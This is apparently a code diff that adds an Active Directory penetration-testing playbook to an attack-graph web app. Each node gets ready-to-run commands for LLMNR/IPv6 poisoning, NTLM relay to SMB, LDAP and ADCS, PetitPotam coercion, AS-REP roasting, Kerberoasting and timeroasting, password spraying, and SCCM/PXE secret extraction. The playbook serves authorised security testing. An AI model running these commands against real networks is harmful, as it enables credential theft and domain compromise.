@@ -918,6 +918,13 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#1d4ed8",
                     "initial": 1,
                     "exploit_text": "Capture baseline traffic and identify broadcast/authentication opportunities.",
+                    "commands": [
+                        "timeout 10m tcpdump -ni eth0 -w scan.cap",
+                        "tshark -qz io,phs -r scan.cap",
+                    ],
+                    "sources": [
+                        "[[Pulling Sensitive Information From Packet Captures]]",
+                    ],
                 },
                 {
                     "key": "network_equipment",
@@ -926,6 +933,7 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#115e59",
                     "initial": 1,
                     "exploit_text": "Map infrastructure devices and management-plane exposure from passive data.",
+                    "note": "Discover network equipment. Translate MACs found in ARP to vendors; Cisco Discovery Protocol (CDP) may be listenable.",
                 },
                 {
                     "key": "dns_dc_discovery",
@@ -934,6 +942,14 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#6d28d9",
                     "initial": 1,
                     "exploit_text": "Identify name servers and DCs via resolv/nslookup/SRV records.",
+                    "note": "Check /etc/resolv.conf for nameserver and search domain (nameserver 10.x.2.5 / search [domain]).",
+                    "commands": [
+                        "nslookup [domain]",
+                        "nslookup -type=SRV _ldap._tcp.dc._msdcs.[domain] | tee -a dcraw",
+                        "cat dcraw| grep ldap | awk -F \" \" '{print$7}'| rev | cut -c 2- | rev | tee dcs.txt",
+                        "nxc smb ./scope.txt | grep \"DC:True\"",
+                        "nmap -sS -n --open -p 53,88 [subnet]",
+                    ],
                 },
                 {
                     "key": "guest_null_sessions",
@@ -942,6 +958,12 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#92400e",
                     "initial": 1,
                     "exploit_text": "Test anonymous SMB/RPC access and collect shares/users/policy data.",
+                    "note": "Do this to every DC / Host. Checks include named pipes.",
+                    "commands": [
+                        "git clone https://github.com/cddmp/enum4linux-ng && cd enum4linux-ng",
+                        "python3 ./enum4linux-ng.py -U [dc ip]",
+                        "enum4linux -U 10.250.8.49 -M  # machines (pre2k candidates)",
+                    ],
                 },
                 {
                     "key": "smb_security",
@@ -950,6 +972,11 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#7e22ce",
                     "initial": 1,
                     "exploit_text": "Track SMB signing disabled and SMBv1 exposure for relay and legacy abuse.",
+                    "commands": [
+                        "cat hosts.txt | grep -a SMBv1:True > smbv1.txt",
+                        "cat smbv1.txt | sort -u | awk -F \" \" '{print $1}' > smbv1IPs.txt",
+                        "nxc smb ./scope.txt --gen-relay-list NoSMBsigning.txt",
+                    ],
                 },
                 {
                     "key": "responder_poisoning",
@@ -958,6 +985,16 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#b91c1c",
                     "initial": 1,
                     "exploit_text": "Validate poisoning opportunities and capture authentication attempts safely.",
+                    "note": "TO TRY: pretender. For LLMNR/NBNS, if you see a hostname constantly, other hosts may request it too — note for later DNS update checks (ADIDNS spoofing/poisoning).",
+                    "commands": [
+                        "git clone https://github.com/lgandx/Responder.git",
+                        "sudo responder -I <interface> -wd",
+                        "ntlmrelayx.py -tf NoSMBsigning-services.txt -smb2support --output-file ntlmResponder.txt -ntlmchallenge 7894234154656702 --no-dump -socks --keep-relaying -multi-relay",
+                    ],
+                    "sources": [
+                        "https://github.com/RedTeamPentesting/pretender",
+                        "https://x.com/secorizon/status/2006443549147930724  (latest Responder update)",
+                    ],
                 },
                 {
                     "key": "mitm6_relay",
@@ -966,6 +1003,16 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#0e7490",
                     "initial": 1,
                     "exploit_text": "Assess mitm6 + ntlmrelayx path to LDAP/SMB/ADCS targets.",
+                    "note": "If you get a relay, brute force all SIDs via SOCKS.",
+                    "commands": [
+                        "mitm6 -d [domain]",
+                        "ntlmrelayx.py -6 -tf NoSMBsigning-services.txt -wh pentestwpad.[domain] -smb2support --output-file ntlmIPV6.txt -ntlmchallenge 7894234154656702 --no-dump -socks --keep-relaying -multi-relay",
+                    ],
+                    "sources": [
+                        "[[NTLM Relay]]",
+                        "[[Kerberos Relaying]]",
+                        "[[SMB,Samba and NetBIOS - 445,137,138,139]]",
+                    ],
                 },
                 {
                     "key": "ldap_unauth",
@@ -974,6 +1021,9 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#4338ca",
                     "initial": 1,
                     "exploit_text": "Test unauthenticated bind and LDAP-based user discovery opportunities.",
+                    "sources": [
+                        "[[🔓LDAP Unauthenticated Bind]]",
+                    ],
                 },
                 {
                     "key": "valid_user_discovery",
@@ -982,6 +1032,19 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#166534",
                     "initial": 1,
                     "exploit_text": "Build/verify a valid user list through LDAP, Kerberos, and external sources.",
+                    "note": "Build the list from OSINT / user-list creation and printer/spooler user lists. Be explicit about the DC if not all are in scope. After valid users are found, try appending DA/SA variants to discover high-priv versions of users.",
+                    "commands": [
+                        "go install github.com/lkarlslund/ldapnomnom@latest",
+                        "ldapnomnom --input FullUserEnum.txt --output UserEnumResults.txt --dnsdomain [domain] --server [dc ip] --parallel 4",
+                        "kerbrute userenum -d [domain] UserEnumResults.txt -o kerbruteEnum1.txt --dc [dc ip] -t 30",
+                        "cat kerbruteEnum1.txt | awk -F \" \" '{print$7}' | grep -v usernames | awk -F \"@\" '{print$1}' | sort -u -f > ValidUsers-UnauthEnum.txt",
+                    ],
+                    "sources": [
+                        "[[5. Create User List for Guessing]]",
+                        "[[Printers and Spoolers]]",
+                        "[[🔓 LDAP User Enumeration]]",
+                        "[[🔓User Enum - No Domain Access Required]]",
+                    ],
                 },
                 {
                     "key": "password_attacks",
@@ -990,6 +1053,17 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#9f1239",
                     "initial": 1,
                     "exploit_text": "Run low-noise spray checks aligned to policy windows and engagement limits.",
+                    "note": "Double-check nothing here will trip password policy. Try creds from the compromised-credential check first, then blank passwords and guest:password. Common formats: Season@year!, SeasonYear!, Company!, Company!!, CompanyYEAR.",
+                    "commands": [
+                        "nxc smb [dc ip] -u ./hoardusers.txt -p ./hoardpass.txt --no-bruteforce --continue-on-success",
+                        "kerbrute --user-as-pass",
+                        "kerbrute passwordspray -d [domain] UserEnumResults.txt Summer@2025! --dc [dc ip]",
+                    ],
+                    "sources": [
+                        "[[4. Compromised Credential Check]]",
+                        "[[5. Create User List for Guessing]]",
+                        "[[Network Service Password Guessing]]",
+                    ],
                 },
                 {
                     "key": "asrep_roast",
@@ -998,6 +1072,35 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#991b1b",
                     "initial": 1,
                     "exploit_text": "Check blind AS-REP roastability and prioritize crackable/high-value accounts.",
+                    "note": "If users are found, check if vulnerable to CVE-2022-33679.",
+                    "commands": [
+                        "nxc ldap [dc ip] -u [users.txt] -p '' --asreproast ASREP-unauth.txt",
+                        "Rubeus.exe asreproast /format:hashcat",
+                        "GetNPUsers.py -usersfile validusers.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip [dc ip] '[domain]/' -k",
+                    ],
+                    "sources": [
+                        "[[ASREP Roasting]]",
+                        "[[4 - Vuln Enumeration]]  (CVE-2022-33679)",
+                    ],
+                },
+                {
+                    "key": "asrep_catcher",
+                    "label": "AS-REP Catcher / ARP Spoof",
+                    "color_start": "#d946ef",
+                    "color_end": "#a21caf",
+                    "initial": 1,
+                    "exploit_text": "ARP-spoof to intercept AS-REP requests and capture pre-auth Kerberos material.",
+                    "note": "If you are going to do an ARP attack, have a packet capture and ntlmrelayx running — you never know.",
+                    "commands": [
+                        "tcpdump -i eth0 -w arpcap.pcap",
+                        "sudo timeout 5m ASRepCatcher relay -dc [dc ip] --stop-spoofing",
+                        "sudo timeout 5m ASRepCatcher listen --stop-spoofing  (ARP the GW)",
+                    ],
+                    "sources": [
+                        "https://github.com/syntaxHax/ASRepCatcher",
+                        "https://www.thehacker.recipes/ad/movement/credentials/dumping/network-protocols",
+                        "[[Pulling Sensitive Information From Packet Captures]]",
+                    ],
                 },
                 {
                     "key": "kerberoast_blind",
@@ -1006,6 +1109,14 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#854d0e",
                     "initial": 1,
                     "exploit_text": "Test no-preauth chaining paths for SPN roast opportunities without creds.",
+                    "note": "Requires a known AS-REP-vulnerable user, no creds.",
+                    "commands": [
+                        "Rubeus.exe keberoast /domain:[domain] /dc:[dc ip] /nopreauth:[asrep user] /spns:[users.txt]",
+                        "GetUserSPNs.py -no-preauth \"[asrep user]\" -usersfile [user list.txt] -dc-host \"[dc ip]\" \"[domain]\"/",
+                    ],
+                    "sources": [
+                        "[[Kerberoast]]",
+                    ],
                 },
                 {
                     "key": "timeroast",
@@ -1014,6 +1125,14 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#0f766e",
                     "initial": 1,
                     "exploit_text": "Validate SNTP-based roastability and extract usable hashes.",
+                    "note": "hashcat mode: 31300",
+                    "commands": [
+                        "nxc smb [dc ip] -M timeroast | tee timeroast.txt",
+                        "cat timeroast.txt | grep -oP '\\$sntp-ms.*' | tee -a timeroasthashes.txt",
+                    ],
+                    "sources": [
+                        "[[Timeroast]]",
+                    ],
                 },
                 {
                     "key": "pre2k",
@@ -1022,6 +1141,16 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#1e293b",
                     "initial": 1,
                     "exploit_text": "Test legacy machine-account naming/password patterns for weak auth.",
+                    "note": "Get a list of hostnames from 1.b Scoping and Lay of the Land. Pwd must be all lowercase: hostname$:hostname. Input file needs to be in hostname$ format.",
+                    "commands": [
+                        "git clone https://github.com/garrettfoster13/pre2k.git && cd pre2k && pipx install .",
+                        "sed -i 's/$/$/' hostnames.txt",
+                        "pre2k unauth -d [domain] -dc-ip [dc ip] -inputfile hostnames.txt",
+                    ],
+                    "sources": [
+                        "[[Pre2k Computer Accounts]]",
+                        "[[1.b - Scoping and Lay of the Land]]",
+                    ],
                 },
                 {
                     "key": "sccm_unauth",
@@ -1030,6 +1159,16 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#5b21b6",
                     "initial": 1,
                     "exploit_text": "Track SCCM servers and validate unauthenticated vulnerability paths.",
+                    "note": "Also PXE; pull NAA creds if you are on an SCCM client host. If auto-decrypt fails, manually grab the boot var hash.",
+                    "commands": [
+                        "python3 SCCMSecrets.py policies -mp http://[sccm server] -cn [client name]  # --altauth if HTTPS",
+                        "python3 SCCMSecrets.py files -dp http://[sccm dp]  # index list of files",
+                        "python3 SCCMSecrets.py files -dp http://[sccm dp] --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf,.bat'",
+                    ],
+                    "sources": [
+                        "[[SCCM (MECM)]]",
+                        "[[SCCM (MECM)#Manually grab boot var hash]]",
+                    ],
                 },
                 {
                     "key": "auth_coerce",
@@ -1038,6 +1177,15 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#c2410c",
                     "initial": 1,
                     "exploit_text": "Validate coercion vectors and whether relay targets are practically reachable.",
+                    "note": "Check Microsoft Exchange Server MRSProxy Pre-Auth NTLM Relay RCE (CVE-2026-62911) — Nessus mentions just using PetitPotam. New printerbug needs Server 2022 or newer. If working, try to relay to ADCS or DC LDAP.",
+                    "commands": [
+                        "git clone https://github.com/topotam/PetitPotam.git && cd PetitPotam",
+                        "python3 PetitPotam.py -d [domain] [listener] [target]",
+                    ],
+                    "sources": [
+                        "[[Authentication Coerce]]",
+                        "https://github.com/topotam/PetitPotam",
+                    ],
                 },
                 {
                     "key": "adcs_relay",
@@ -1046,6 +1194,14 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#075985",
                     "initial": 1,
                     "exploit_text": "Identify certsrv endpoints and validate NTLM relay-to-ADCS feasibility.",
+                    "note": "Running PXE Thief afterwards may trigger that server to connect back to the attack machine.",
+                    "commands": [
+                        "nmap -sT -Pn -v -T2 --open -p 80,443 -iL machinenamesfull -oA webport",
+                        "cat webport.nmap | grep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | tee webIPs.txt",
+                        "for i in $(cat webIPs.txt); do echo $i && curl -s http://$i/certsrv/certfnsh.asp | grep 401; done",
+                        "for i in $(cat webIPs.txt); do echo $i && curl -s https://$i/certsrv/certfnsh.asp | grep 401; done",
+                        "impacket-ntlmrelayx -ts -t http://[adcs IP/FQDN]/certsrv/certfnsh.asp -smb2support -ntlmchallenge 7894234154656702 --adcs --template DomainController",
+                    ],
                 },
                 {
                     "key": "dns_updates",
@@ -1054,6 +1210,17 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#9a3412",
                     "initial": 1,
                     "exploit_text": "Assess non-secure/anonymous dynamic DNS update risk and relay implications.",
+                    "note": "Success returns Rcode.NOERROR (or 0). To remain non-disruptive, try to update your provided hostname with its current IP address. May be disruptive for a normal pentest — demonstrate on provided systems only.",
+                    "commands": [
+                        "nslookup [hostname]",
+                        "python3 ./adddns.py --domain [domain] --dnsip [ADIDNS Server ip] --hostname [target hostname] --hostip [IP address to modify]",
+                    ],
+                    "sources": [
+                        "https://github.com/almandin/krbjack",
+                        "https://github.com/decoder-it/KrbRelayEx",
+                        "[[Anonymous DNS Updates - Kerbrelay]]",
+                        "[[2 - Authenticated AD Enumeration#DNS]]",
+                    ],
                 },
                 {
                     "key": "wsus_unauth",
@@ -1062,6 +1229,18 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#14532d",
                     "initial": 1,
                     "exploit_text": "Check unauth WSUS discovery paths before authenticated validation.",
+                    "note": "wsuks runs the WSUS NTLM relay attack (trustedsec blog).",
+                    "commands": [
+                        "nmap -sSVC -Pn --open -p 8530,8531 -iL [hosts]",
+                        "sudo wsuks -t [target] --WSUS-Server [wsus server]",
+                        "python3 wsusniff.py -i <interface>",
+                    ],
+                    "sources": [
+                        "https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight",
+                        "https://github.com/NeffIsBack/wsuks",
+                        "https://github.com/Coontzy1/WSUScripts/tree/main",
+                        "[[WSUS]]",
+                    ],
                 },
                 {
                     "key": "web_applications",
@@ -1070,6 +1249,10 @@ def build(st: AppState, app) -> APIRouter:
                     "color_end": "#0c4a6e",
                     "initial": 1,
                     "exploit_text": "Check internal web apps for default credentials and practical exploit paths.",
+                    "note": "Check unauth web endpoints. Run trufflehog on extracted files for leaked secrets.",
+                    "commands": [
+                        "trufflehog filesystem path/to/file1.txt path/to/dir --no-verification",
+                    ],
                 },
             ],
             "edges": [
@@ -1161,6 +1344,14 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Unauth LDAP sessions",
                     "title": "Unauthenticated LDAP Sessions",
                     "text": "Validate anonymous/unauth LDAP session behavior and exposed directory data.",
+                    "note": "Do this to every DC / Host. Checks include named pipes.",
+                    "commands": [
+                        "git clone https://github.com/cddmp/enum4linux-ng && cd enum4linux-ng",
+                        "while read -r host; do [[ -n \"$host\" ]] && python3 ./enum4linux-ng.py -U \"$host\"; done < dcs.txt",
+                        "python3 ./enum4linux-ng.py -U [dc ip] | grep 'username:' > RPCUserEnum.txt",
+                        "python3 ./enum4linux-ng.py -U [dc ip] | grep 'description:'",
+                        "enum4linux -U [dc ip] -M  # machines for pre2k",
+                    ],
                 },
                 {
                     "id": "null_smbmap",
@@ -1168,6 +1359,27 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "SMB null/anon session",
                     "title": "SMB Null/Anonymous Session",
                     "text": "Validate SMB null/anonymous session access and reachable share data.",
+                    "note": "Search for Null Auth:True. nxc also tries RPC.",
+                    "commands": [
+                        "smbmap --host-file ./dcs.txt -u '' -p ''",
+                        "smbmap --host-file ./dcs.txt -u 'a' -p ''",
+                        "nxc smb [host] -u '' -p '' --shares",
+                        "nxc smb [host] -u a -p '' --shares",
+                        "nxc smb [host] --shares --pass-pol --users  # if available",
+                        "nxc smb [host] --users-export domainusers.txt  # to try and ensure you get them all",
+                        "nxc smb [host] --rid-brute",
+                    ],
+                },
+                {
+                    "id": "null_share_access",
+                    "parent_id": "guest_null_sessions",
+                    "label": "Anonymous share access",
+                    "title": "Anonymous SMB Share Access",
+                    "text": "Anonymous access to SMB shares; enumerate and read exposed share data.",
+                    "commands": [
+                        "smbclient -L '//[host]/' -U '%'",
+                        "smbclient '//[host]/SecretsNStuff' -U '%'",
+                    ],
                 },
                 {
                     "id": "null_rpc",
@@ -1175,6 +1387,14 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "RPC null session works",
                     "title": "RPC Null Session",
                     "text": "rpcclient unauthenticated calls returned domain user/group data.",
+                    "note": "Group workflow: enumdomgroups → querygroup [rid] → querygroup mem [rid] → enumdomusers → map RIDs to find regular user accounts in privileged groups. getdompwinfo returns minimum password length, history, max/min age, and lockout values.",
+                    "commands": [
+                        "rpcclient -W 'WORKGROUP' -c enumdomusers -U''%'' '[dc ip]' 2>&1",
+                        "rpcclient -U '' -N [dc ip] -c 'getdompwinfo'",
+                        "rpcclient -U '' -N [dc ip] -c 'enumdomgroups'",
+                        "rpcclient -U '' -N [dc ip] -c 'querygroup [rid]'",
+                        "rpcclient -U '' -N [dc ip] -c 'querygroup mem [rid]'",
+                    ],
                 },
                 {
                     "id": "smb_signing_off_unauth",
@@ -1182,6 +1402,9 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "SMB signing disabled",
                     "title": "SMB Signing Not Required",
                     "text": "Hosts identified where SMB signing is not enforced.",
+                    "commands": [
+                        "nxc smb ./scope.txt --gen-relay-list NoSMBsigning.txt",
+                    ],
                 },
                 {
                     "id": "smb_v1_legacy",
@@ -1189,6 +1412,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "SMBv1 enabled",
                     "title": "SMBv1 Exposure",
                     "text": "Legacy SMBv1-enabled hosts identified.",
+                    "commands": [
+                        "cat hosts.txt | grep -a SMBv1:True > smbv1.txt",
+                        "cat smbv1.txt | sort -u | awk -F \\\" \\\" '{print $1}' > smbv1IPs.txt  # get a list of IPs",
+                    ],
                 },
                 {
                     "id": "smb_relay_list",
@@ -1196,6 +1423,11 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Relay target list built",
                     "title": "SMB Relay Candidate List",
                     "text": "Generated relay list for ntlmrelayx and downstream validation.",
+                    "note": "For relay things: add specific services to the list, then add DCs.",
+                    "commands": [
+                        "cat NoSMBsigning.txt| awk '{print \"smb://\"$0\"\\nrpc://\"$0\"\\nldap://\"$0}' > NoSMBsigning-services.txt",
+                        "cat DCs.txt | awk '{print \"ldaps://\"$0\"\\nldap://\"$0}' >> NoSMBsigning-services.txt",
+                    ],
                 },
                 {
                     "id": "resp_host_repeat",
@@ -1203,6 +1435,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Repeated hostname requests",
                     "title": "Repeated Name Requests",
                     "text": "Recurring unresolved hostnames indicate likely broad poison opportunity.",
+                    "note": "If you see a hostname constantly, other hosts may request it too — make a note for later to check for DNS updates (ADIDNS spoofing/poisoning).",
                 },
                 {
                     "id": "resp_hashes",
@@ -1217,6 +1450,9 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Capture-to-relay path",
                     "title": "Capture to Relay",
                     "text": "Observed captures can be chained into relay against approved targets.",
+                    "commands": [
+                        "ntlmrelayx.py -tf NoSMBsigning-services.txt -smb2support --output-file ntlmResponder.txt -ntlmchallenge 7894234154656702 --no-dump -socks --keep-relaying -multi-relay",
+                    ],
                 },
                 {
                     "id": "mitm6_running",
@@ -1224,6 +1460,9 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "mitm6 successful",
                     "title": "mitm6 Active",
                     "text": "mitm6 operational and intercepting relevant authentication traffic.",
+                    "commands": [
+                        "mitm6 -d [domain]",
+                    ],
                 },
                 {
                     "id": "mitm6_ntlmrelay",
@@ -1231,6 +1470,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "ntlmrelayx IPv6 relay works",
                     "title": "IPv6 NTLM Relay Success",
                     "text": "IPv6 relay chain validated with ntlmrelayx against target set.",
+                    "note": "If a relay is obtained, brute-force all SIDs via SOCKS.",
+                    "commands": [
+                        "ntlmrelayx.py -6 -tf NoSMBsigning-services.txt -wh pentestwpad.[domain] -smb2support --output-file ntlmIPV6.txt -ntlmchallenge 7894234154656702 --no-dump -socks --keep-relaying -multi-relay",
+                    ],
                 },
                 {
                     "id": "mitm6_ldap_or_adcs",
@@ -1266,6 +1509,11 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Seed lists collected",
                     "title": "User Seed Collection",
                     "text": "Built initial user list from OSINT, printer books, and naming patterns.",
+                    "note": "Sources: OSINT user-list creation and printer/spooler user lists.",
+                    "sources": [
+                        "[[5. Create User List for Guessing]]",
+                        "[[Printers and Spoolers]]",
+                    ],
                 },
                 {
                     "id": "users_ldapnomnom",
@@ -1273,6 +1521,13 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "LDAP user validation",
                     "title": "LDAP User Validation",
                     "text": "Validated candidate users through LDAP-focused enumeration tooling.",
+                    "commands": [
+                        "go install github.com/lkarlslund/ldapnomnom@latest",
+                        "ldapnomnom --input FullUserEnum.txt --output UserEnumResults.txt --dnsdomain [domain] --server [dc ip] --parallel 4",
+                    ],
+                    "sources": [
+                        "[[🔓 LDAP User Enumeration]]",
+                    ],
                 },
                 {
                     "id": "users_kerbrute",
@@ -1280,6 +1535,14 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Kerberos userenum hits",
                     "title": "Kerberos User Enumeration",
                     "text": "Kerberos userenum produced confirmed valid accounts.",
+                    "note": "Be explicit about the DC if not all are in scope.",
+                    "commands": [
+                        "kerbrute userenum -d [domain] UserEnumResults.txt -o kerbruteEnum1.txt --dc [dc ip] -t 30",
+                        "cat kerbruteEnum1.txt | awk -F \\\" \\\" '{print$7}' | grep -v usernames | awk -F \\\"@\\\" '{print$1}' | sort -u -f > ValidUsers-UnauthEnum.txt",
+                    ],
+                    "sources": [
+                        "[[🔓User Enum - No Domain Access Required]]",
+                    ],
                 },
                 {
                     "id": "pwd_policy_checked",
@@ -1287,6 +1550,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Policy-safe spray window",
                     "title": "Spray Safety Confirmed",
                     "text": "Password policy reviewed before spraying to reduce lockout risk.",
+                    "note": "Review password policy before spraying to reduce lockout risk — getdompwinfo (see RPC null session) shows minimum length, history, max/min age, and lockout values.",
                 },
                 {
                     "id": "pwd_blank_or_userpass",
@@ -1294,6 +1558,11 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Blank/user-as-pass tested",
                     "title": "Low-Noise Password Guessing",
                     "text": "Tested blank and user-as-password patterns against valid users.",
+                    "note": "Try blank password for all valid accounts; also try guest:password.",
+                    "commands": [
+                        "nxc smb [dc ip] -u ./hoardusers.txt -p ./hoardpass.txt --no-bruteforce --continue-on-success",
+                        "kerbrute --user-as-pass",
+                    ],
                 },
                 {
                     "id": "pwd_common_format_hits",
@@ -1301,6 +1570,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Common format hit",
                     "title": "Password Format Success",
                     "text": "Season/company-based pattern produced valid authentication.",
+                    "note": "Common formats: Season@year!, SeasonYear!, Company!, Company!!, CompanyYEAR.",
+                    "commands": [
+                        "kerbrute passwordspray -d [domain] UserEnumResults.txt Summer@2025! --dc [dc ip]",
+                    ],
                 },
                 {
                     "id": "asrep_enum",
@@ -1308,6 +1581,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "AS-REP roastable users found",
                     "title": "Roastable Users Identified",
                     "text": "Enumerated users with pre-auth disabled and collected hashes.",
+                    "commands": [
+                        "nxc ldap [dc ip] -u [users.txt] -p '' --asreproast ASREP-unauth.txt",
+                        "GetNPUsers.py -usersfile validusers.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip [dc ip] '[domain]/' -k",
+                    ],
                 },
                 {
                     "id": "asrep_crackable",
@@ -1329,6 +1606,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "No-preauth chain viable",
                     "title": "Blind Kerberoast Chain",
                     "text": "No-preauth account path supports blind Kerberoast attempt.",
+                    "note": "Requires a known AS-REP-vulnerable user (no creds).",
                 },
                 {
                     "id": "kerb_spn_candidates",
@@ -1336,6 +1614,9 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "SPN candidates identified",
                     "title": "SPN Candidate Set",
                     "text": "Built candidate SPN user list for focused roasting checks.",
+                    "commands": [
+                        "GetUserSPNs.py -no-preauth \\\"[asrep user]\\\" -usersfile [user list.txt] -dc-host \\\"[dc ip]\\\" \\\"[domain]\\\"/",
+                    ],
                 },
                 {
                     "id": "kerb_ticket_material",
@@ -1350,6 +1631,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "SNTP roast hashes found",
                     "title": "Timeroast Hash Capture",
                     "text": "Timeroast module returned hash artifacts for cracking attempts.",
+                    "commands": [
+                        "nxc smb [dc ip] -M timeroast | tee timeroast.txt",
+                        "cat timeroast.txt | grep -oP '\\\\$sntp-ms.*' | tee -a timeroasthashes.txt",
+                    ],
                 },
                 {
                     "id": "time_crackability",
@@ -1357,6 +1642,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Hash crackability assessed",
                     "title": "Timeroast Crackability",
                     "text": "Validated cracking feasibility and likely impact of recovered material.",
+                    "note": "hashcat mode: 31300",
                 },
                 {
                     "id": "time_reuse",
@@ -1371,6 +1657,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Hostname list built",
                     "title": "Pre2k Candidate Hostnames",
                     "text": "Prepared host-derived candidate machine accounts for pre2k checks.",
+                    "note": "Get a list of hostnames from 1.b Scoping and Lay of the Land. Input file must be in hostname$ format.",
                 },
                 {
                     "id": "pre2k_userpass",
@@ -1378,6 +1665,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "hostname$:hostname hit",
                     "title": "Pre2k Default Pattern Hit",
                     "text": "Legacy computer-account password pattern produced successful auth.",
+                    "note": "Pwd must be all lowercase: hostname$:hostname.",
+                    "commands": [
+                        "nxc smb [dc ip] -u ./pre2kusers.txt -p ./pre2kpass.txt --no-bruteforce --continue-on-success",
+                    ],
                 },
                 {
                     "id": "pre2k_blank",
@@ -1385,6 +1676,9 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Blank machine password works",
                     "title": "Blank Machine Password",
                     "text": "Blank password accepted for candidate machine account.",
+                    "commands": [
+                        "nxc smb [dc ip] -u ./pre2kusers.txt -p '' --no-bruteforce --continue-on-success",
+                    ],
                 },
                 {
                     "id": "sccm_pxe",
@@ -1392,6 +1686,15 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "PXE discovery path",
                     "title": "PXE Exposure",
                     "text": "PXE services exposed enough data for unauth reconnaissance.",
+                    "note": "If you have issues auto-decrypt, manually grab the boot var hash.",
+                    "commands": [
+                        "git clone https://github.com/Kahvi-0/pxethiefy.git && cd pxethiefy",
+                        "python3 -m venv pxethiefy && source pxethiefy/bin/activate && python3 -m pip install -r requirements.txt",
+                        "python3 ./pxethiefy.py explore -i [ethernet]",
+                        "git clone https://github.com/blurbdust/PXEThief.git && cd PXEThief",
+                        "python3 -m venv pxethief && source pxethief/bin/activate && python3 -m pip install -r requirements.txt",
+                        "python3 ./pxethief.py 1",
+                    ],
                 },
                 {
                     "id": "sccm_policy_read",
@@ -1399,6 +1702,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Unauth policy read",
                     "title": "Unauthenticated Policy Access",
                     "text": "SCCM policies readable without valid credentials.",
+                    "note": "Use --altauth if HTTPS.",
+                    "commands": [
+                        "python3 SCCMSecrets.py policies -mp http://[sccm server] -cn [client name]",
+                    ],
                 },
                 {
                     "id": "sccm_file_read",
@@ -1406,6 +1713,12 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Unauth file read",
                     "title": "Unauthenticated File Access",
                     "text": "SCCM distribution/file endpoints exposed sensitive artifacts.",
+                    "note": "Note files of interest by extension, then run trufflehog on extracted files for leaked secrets.",
+                    "commands": [
+                        "python3 SCCMSecrets.py files -dp http://[sccm dp]  # get index list of files",
+                        "python3 SCCMSecrets.py files -dp http://[sccm dp] --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf,.bat'",
+                        "trufflehog filesystem path/to/file1.txt path/to/dir --no-verification",
+                    ],
                 },
                 {
                     "id": "coerce_petipotam",
@@ -1413,6 +1726,14 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "PetitPotam works",
                     "title": "PetitPotam Coercion",
                     "text": "Unauthentication coercion triggered target auth to listener.",
+                    "note": "Also check Exchange MRSProxy Pre-Auth NTLM Relay RCE (CVE-2026-62911) — Nessus mentions just using PetitPotam.",
+                    "commands": [
+                        "git clone https://github.com/topotam/PetitPotam.git && cd PetitPotam",
+                        "python3 PetitPotam.py -d [domain] [listener] [target]",
+                    ],
+                    "sources": [
+                        "https://github.com/topotam/PetitPotam",
+                    ],
                 },
                 {
                     "id": "coerce_printerbug",
@@ -1420,6 +1741,11 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Printer bug path works",
                     "title": "Printer Coercion",
                     "text": "Printer-based coercion path validated against in-scope hosts.",
+                    "note": "New printerbug needs to be Server 2022 or newer.",
+                    "commands": [
+                        "git clone https://github.com/decoder-it/printerbugnew.git && cd printerbugnew",
+                        "printerbugnew.py [target]",
+                    ],
                 },
                 {
                     "id": "coerce_relayable",
@@ -1427,6 +1753,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Coerced auth relayable",
                     "title": "Relayable Coercion",
                     "text": "Coerced authentication can be relayed to approved targets.",
+                    "note": "If working, try to relay to ADCS or DC LDAP.",
                 },
                 {
                     "id": "adcs_web_enum",
@@ -1434,6 +1761,12 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "certsrv endpoints found",
                     "title": "ADCS Web Enrollment Found",
